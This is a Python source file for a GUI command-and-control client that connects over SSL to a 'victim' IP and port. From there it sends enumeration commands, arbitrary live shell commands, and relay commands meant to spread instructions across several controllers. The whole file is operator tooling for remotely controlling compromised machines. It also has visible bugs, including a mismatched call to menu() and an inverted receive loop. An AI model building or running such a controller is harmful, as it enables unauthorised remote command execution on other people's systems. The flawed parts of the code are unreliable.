import socket
import ssl
import PySimpleGUI as sg
import sys

def menu(cert ,host ,port):
    """
        Description:

            A GUI(Graphical User Interface) MENU to allow different functions to be carried 
            out on the controller. Such as; Enumeration, Live Commands and Relay command.

        Arguments:
            
            cert -- Location of the certificate for authentication
            host  -- The ip address of the server
            port  -- The port to bind with
            
    """

    layout = [[sg.Text('Not Setup', background_color='red',key='-OUT-')],                   #Menu layout with;connected ,Setup ,Enumeration ,Live Commands and Relay check boxes 
             [sg.Checkbox('Setup', size=(100,1))],                                          #with ok and quit button
             [sg.Checkbox('Enumeration')],
             [sg.Checkbox('Live Commands')],
             [sg.Checkbox('Relay Commands')],

             [sg.Button('Ok'), sg.Button('Quit')]]

    window = sg.Window('MAIN MENU', layout)                                                 # Create the window with the main 'MAIN MENU'


    while True:                                                                             # Display and interact with the Window using an Event Loop
        event, values = window.read()
       
        if event == sg.WINDOW_CLOSED or event == 'Quit':                                    # See if user wants to quit or window was closed then break out of the program
            break
        elif (values[0]==True):                                                             # If setup has been checked call the setup function to get the values host and port
            options=setup()
            host=options[0]
            port=options[1]
            window['-OUT-'].update('all setup:ip:'+str(host)+' and port:'+str(port), background_color='green')  # Update the connection text to green and the port/IP selected 
            window.refresh()                                                                #Update the window
        elif (values[0]==False):
            window['-OUT-'].update('Not Setup', background_color='red')                     # Update the connection text to red and text to not setup
            window.refresh()                                                                # Update the window
        elif (values[1]==True):
            interact_built(cert ,host ,port)
        elif (values[2]==True):
            interact_GUI(cert , host ,port)
        elif (values[3]==True):
            Relay_GUI(cert , host ,port)
        elif (host ==0):
            window['-OUT-'].update('Not Setup', background_color='red')                     # Update the connection text to red and text to not setup
            window.refresh()                                                                # Update the window
    
    window.close()                                                                          # Removes from the screen
def interact_built(cert ,host ,port):
    """
        Description:

            A GUI(Graphical User Interface) MENU to allow built in enumeration 
            commands.

        Arguments:
            
            cert -- Location of the certificate for authentication
            host  -- The ip address of the server
            port  -- The port to bind with
            
    """
    sg.theme('DarkGrey14')                                                                 # Set the theme of the menu
    
    layout = [[sg.Text('Script/Commands to execute', size=(40, 1))],                       # Sets the layout of the built in commands; ID, Process, Programs and OS Type
             [sg.Button('ID')],                                                            # with the an ok and wuit button
             [sg.Button('Processes')],
             [sg.Button('Programs')],
             [sg.Button('OS Type')],
             [sg.Output(size=(88, 20), font='Courier 10')],

             [sg.Button('Ok'), sg.Button('Quit')]]

    window = sg.Window('Built In Commands', layout)                                        # Creates the window with the 'Built IN Commands' title

   
    while True:                                                                            # Display and interact with the Window using an Event Loop
        event, values = window.read()

        if event == sg.WINDOW_CLOSED or event == 'Quit':                                   # See if user wants to quit or window was closed then break out of the program
            break
        elif (event=='ID'):
            interact(cert, host, port, 'id')                                               # Sends standard linux commands to the intteract function 
        elif (event=='Processes'):
            interact(cert, host, port, 'ps aux')
        elif (event=='Programs'):
            interact(cert, host, port, 'dpkg -l')
        elif (event=='OS Type'):
            interact(cert, host, port, 'uname -a')
  
    window.close()                                                                         # Finish up by removing from the screen
def interact_GUI(cert ,host ,port):
    """
        Description:

            A GUI(Graphical User Interface) MENU to send live commands and recieve the output
            in the command box(including relay commands) with error output.

        Arguments:
            
            cert -- Location of the certificate for authentication
            host  -- The ip address of the server
            port  -- The port to bind with
            
    """
    sg.theme('DarkGrey14')                                                                 #Set the theme of the menu

    layout = [                                                                             #Sets the layout with two inputs for the port to relay and ip with the command to send
        [sg.Text('Script/Commands to execute (for relay "relay ip port command")', size=(40, 1))],
        [sg.Output(size=(88, 20), font='Courier 10')],
        [sg.Button('Quit')],
        [sg.Text('Manual command', size=(15, 1)), sg.Input(focus=True, key='-IN-'), sg.Button('Run', bind_return_key=True)]
    ]

    window = sg.Window('Script Launcher', layout)                                          # Creates the window with the 'Script Launcher' title


    while True:                                                                            # Loop taking in user input and using it to call scripts
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == 'Quit':                                   # See if user wants to quit or window was closed then break out of the program
            break
        elif event == 'Run':                                                               #Takes in the commands seperated by  a " " and joins them together finally passing 
            args = values['-IN-'].split(' ')                                               #it to the interact function
            print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')
            create_argument=(args[0], *args[1:])
            argument=' '.join(create_argument)
            interact(cert ,host ,port ,argument)
def Relay_GUI(cert ,host ,port):
    """
        Description:

            A GUI(Graphical User Interface) MENU to relay a command to two
            or more controllers using a port, IP and command

        Arguments:
            
            cert -- Location of the certificate for authentication
            host  -- The ip address of the server
            port  -- The port to bind with
            
    """
    sg.theme('DarkGrey14')                                                      #Set the theme of the menu

    layout = [
        [sg.Text('Relay commands to be executed', size=(40, 1))],               #Sets the layout of relay menu with 3 input boxes for the IP, port and command to send
        [sg.Output(size=(88, 20), font='Courier 10')],
        [sg.Text('Relay IP', size=(15, 1)), sg.InputText()],
        [sg.Text('Relay Port', size=(15, 1)), sg.InputText()],
        [sg.Button('Quit')],
        [sg.Text('Manual command', size=(15, 1)), sg.Input(focus=True, key='-IN-'), sg.Button('Run', bind_return_key=True)]
    ]

    window = sg.Window('Script launcher', layout)                               # Creates the window with the 'Built IN Commands' title



    while True:                                                                 # Loop taking in user input and using it to call scripts
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == 'Quit':                        # See if user wants to quit or window was closed then break out of the program
            break
        elif event == 'Run':                                                    #Takes in the commands seperated by  a " " and joins them together and creates an 
            args = values['-IN-'].split(' ')                                    # Argument that send the command in a relay format so the controller uunderstands. 
            print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')        
            create_argument=(args[0], *args[1:])
            argument=' '.join(create_argument)
            argument="relay "+str(values[0])+" "+str(values[1])+" "+str(argument)
            interact(cert ,host ,port ,argument)                                # Send the relay command to the interact function with the port and IP
def setup():   
    sg.theme('Topanga')                                                         # Sets the theme


    layout = [                                                                  #Sets the layout for setup with 2 inputs for the port and IP address with an ok and quit button
        [sg.Text('Please enter your Victims IP and port to run')],
        [sg.Text('Vicims IP', size=(15, 1)), sg.InputText()],
        [sg.Text('Port', size=(15, 1)), sg.InputText()],
        [sg.Submit(), sg.Cancel()]
    ]

    window = sg.Window('Setup MENU', layout)                                    # Creates the window with the 'Setup' title and read the values from the inputs
    event, values = window.read()
    window.close()
    host=values[0]
    port=values[1]

    return host,port

def interact(cert,host ,port ,data="id"):
    """
        Description:

            Allows commands to be sent to a given port and IP with bidirectional encryptionc
            using SSL given the certificate. Also allows encrpted data to be recieved and outputted

        Arguments:
            
            cert  -- Location of the certificate for authentication
            host  -- The ip address of the server
            port  -- The port to bind with
            data  -- Command to send
            
    """
    context = ssl.SSLContext()                                                         #Managers the SSL settings
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations(cert)                                                #Loads the certification file and Key to allow back to back encyption
    with socket.create_connection((host, port)) as sock:
        ssock=context.wrap_socket(sock, server_hostname=host)                          #Create secure socket and print the vesision and certificate 
        print(ssock.version())
        print(ssock.getpeercert())
        ssock.send(data.encode())                                                      #Sends the command encoded then splits it back up to check for relay 
        command_split=data.split(" ")
        if (command_split[0]=="relay"): 
            print ("relayed")
        else:
            while 1:                                                                   #Creates a continuel loop that looks for data to be recieved 
                recieve = ssock.recv(1024)
                if (recieve  !=0):
                    break
                print(f"Recieved: {recieve}")
            print(f"Recieved: {recieve}")
            ssock.shutdown(2)                                                          #Nicely close the encrypted channel
def get_host_info():
    """
        Description:

            Gets the host IP address and returns the value

        Arguments:
            None

        Returns:
            the host/IP of the current system
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                               #Uses a socket and standard port (80) and address(8.8.8.8) to retrieve the IP
    s.connect(("8.8.8.8", 80))
    host=(s.getsockname()[0])
    s.close()                                                                          #Closes the connection
    return host                                                                        #Returns the address
if __name__=="__main__":
    port = 4000                                                                        #Hardcodes the values; port, cert, key as default
    cert="./cert.pem"
    key="./key.pem"
    host=get_host_info()                                                               #Retrives the IP from the function get_host_info 
    print(len(sys.argv))                                                               #Allow arguments to be passed such as h for help and u, p and c sending commadns to a 
    if ((len(sys.argv))>=2):                                                           #controller
        if (sys.argv[1]=="h"):
            print("""
            host = -u
            port = -p
            command = -c
            example:
            python3 client.py -u '192.1168.237.129' -p '3000' -c 'ls'
    """)
        elif (sys.argv[1]=="-u"):
            host=sys.argv[2]
            print(host)
            if (sys.argv[3]=="-p"):
                port=sys.argv[4]
                print(port)
                if (sys.argv[5]=="-c"):
                    command=sys.argv[6]
                    print(command)
                    interact(cert, host, port, command)
                else:
                    print("forgot to add the command argument '-c'")
            else:
                print("forgot to add the port argument '-p'")
        else:
            print("""
            host = -u
            port = -p
            command = -c
    """)
    else:
        menu(cert ,key, host ,port)                                                     #Calls tthe menu
